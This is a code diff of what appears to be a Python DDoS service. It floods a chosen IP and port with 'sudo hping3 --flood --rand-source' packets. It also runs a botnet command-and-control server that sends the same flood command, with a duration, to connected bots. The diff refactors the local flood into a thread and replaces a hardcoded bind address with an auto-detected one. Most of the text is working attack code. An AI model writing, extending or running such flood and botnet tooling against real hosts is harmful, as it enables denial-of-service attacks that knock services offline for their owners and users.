@@ -18,21 +18,13 @@ def DDOSAttack():
 
     # launch dos on bots using a seperate thread
     bots = threading.Thread(target=botnet, args=(ipAddress, portNumber, packetSize, attackType, duration))
+    attack = threading.Thread(target=ddos, args=(ipAddress, portNumber, packetSize, attackType, duration))
     bots.start()
+    attack.start()
 
-    ddosCommand = subprocess.Popen(
-        ['sudo', 'hping3', attackType, '-d', packetSize, '--flood', '--rand-source', '-p', portNumber, ipAddress],
-        stdout=subprocess.PIPE,
-        text=True)
-    time.sleep(duration) # carry out attack for specified duration
-
-    try:
-        ddosCommand.send_signal(signal.SIGINT) # Send CTRL+c to kill the child process
-    except subprocess.TimeoutExpired:
-        print('Timeout occured')
-    
-    ddosCommand.kill()
+    # wait for threads to finish
     bots.join()
+    attack.join()
     return ""
 
 @ddosAttack.post("/latency")
@@ -53,22 +45,36 @@ def checkLatency():
     
 def send_commands(conn, ipAddress, portNumber, packetSize, attackType, duration):
     command = "sudo hping3 {attackType} -d {packetSize} --flood --rand-source -p {portNumber} {ipAddress}"
-    cmd = command.format(
+    commandParam = command.format(
         attackType=attackType,
         packetSize=packetSize,
         portNumber=portNumber,
         ipAddress=ipAddress)
 
-    if len(str.encode(cmd)) > 0:
-        conn.send(str.encode(cmd))
+    finalCommand = f"{commandParam} --duration {duration}"
+
+    if len(str.encode(finalCommand)) > 0:
+        conn.send(str.encode(finalCommand))
         client_response = str(conn.recv(1024), "utf-8")
         print(client_response, end="")
 
+def ddos(ipAddress, portNumber, packetSize, attackType, duration):
+    dosCommand = subprocess.Popen(
+        ['sudo', 'hping3', attackType, '-d', packetSize, '--flood', '--rand-source', '-p', portNumber, ipAddress],
+        stdout=subprocess.PIPE,
+        text=True)
+    time.sleep(duration) # carry out attack for specified duration
+
+    try:
+        dosCommand.send_signal(signal.SIGINT) # Send CTRL+c to kill the child process
+    except subprocess.TimeoutExpired:
+        print('Timeout occured')
+
+    dosCommand.kill()
+
 
 def botnet(ipAddress, portNumber, packetSize, attackType, duration):
-    # hostname=socket.gethostname()   
-    # bindIp=socket.gethostbyname(hostname)   
-    bindIp="192.168.1.34"
+    bindIp = getIpAddress()
     bindPort = 1046
     servAdd = (bindIp, bindPort)
     
@@ -90,7 +96,7 @@ def botnet(ipAddress, portNumber, packetSize, attackType, duration):
             conn, addr = server.accept() # accept the connection
             
             # Create a new thread to handle the connection
-            client_thread = threading.Thread(target=handle_client, args=(conn, addr, ipAddress, portNumber, packetSize, attackType, duration))
+            client_thread = threading.Thread(target=handleClient, args=(conn, addr, ipAddress, portNumber, packetSize, attackType, duration))
             client_thread.start()
             
             threads.append(client_thread) # Store the thread in the list
@@ -102,8 +108,15 @@ def botnet(ipAddress, portNumber, packetSize, attackType, duration):
         thread.join()
 
 
-def handle_client(conn, addr, ipAddress, portNumber, packetSize, attackType, duration):
+def handleClient(conn, addr, ipAddress, portNumber, packetSize, attackType, duration):
     # Handle the connection
     print('accepted connection from {} and port {}'.format(addr[0], addr[1]))
     send_commands(conn, ipAddress, portNumber, packetSize, attackType, duration)
     conn.close()
+
+def getIpAddress():
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.connect(("8.8.8.8", 80))
+    ip = s.getsockname()[0]
+    s.close()
+    return ip
